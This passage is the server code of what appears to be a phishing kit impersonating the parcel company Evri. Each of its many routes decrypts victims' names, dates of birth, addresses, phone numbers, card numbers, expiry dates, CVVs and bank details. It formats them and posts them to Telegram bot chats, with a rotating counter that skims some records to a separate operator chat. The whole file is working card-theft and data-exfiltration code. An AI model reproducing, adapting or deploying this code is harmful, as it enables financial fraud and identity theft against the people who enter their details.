  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (F_zn66 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        F_zn66 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFZ:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1612469030&text=Evri:\n${originalText}`
        );
        F_zn66 += 1;
      }

      res.send("Update Completed");
    });
});

let timesz = 0;

app.options("/timeszEvri", cors());

app.post("/timeszEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (timesz == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        timesz = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriTimesz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2032190159&text=Evri:\n${originalText}`
        );
        timesz += 1;
      }

      res.send("Update Completed");
    });
});

let TheOnlyMY = 2;

app.options("/TheOnlyMYEvri", cors());

app.post("/TheOnlyMYEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriTheOnlyMY:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=Evri:\n${originalText}`
        );
        TheOnlyMY += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/hoodsEvri", cors());

app.post("/hoodsEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (hoods == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        hoods = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriHoods:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Evri:\n${originalText}`
        );
        hoods += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/flashEvri", cors());

app.post("/flashEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (F_zn66 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        F_zn66 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFlash:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-460917026&text=Evri:\n${originalText}`
        );
        F_zn66 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/haytchEvri", cors());

app.post("/haytchEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-673884200&text=HAYTCHRES:\n${originalText}`
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

let daanger = 4;

app.options("/dangerrEvri", cors());

app.post("/dangerrEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (daanger == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        daanger = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriDaanger:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=637332768&text=Evri:\n${originalText}`
        );
        daanger += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/cdbEvri", cors());

app.post("/cdbEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (F_zn66 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        F_zn66 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCDG:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=911916233&text=Evri:\n${originalText}`
        );
        F_zn66 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/masonEvri", cors());

app.post("/masonEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=Evri:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

let manEvri = 5;

app.options("/mannymanEvri", cors());

app.post("/mannymanEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (manEvri == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        manEvri = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriManny:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=Evri:\n${originalText}`
        );
        manEvri += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/kelvEvri", cors());

app.post("/kelvEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Evri:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/fpaysEvri", cors());

app.post("/fpaysEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
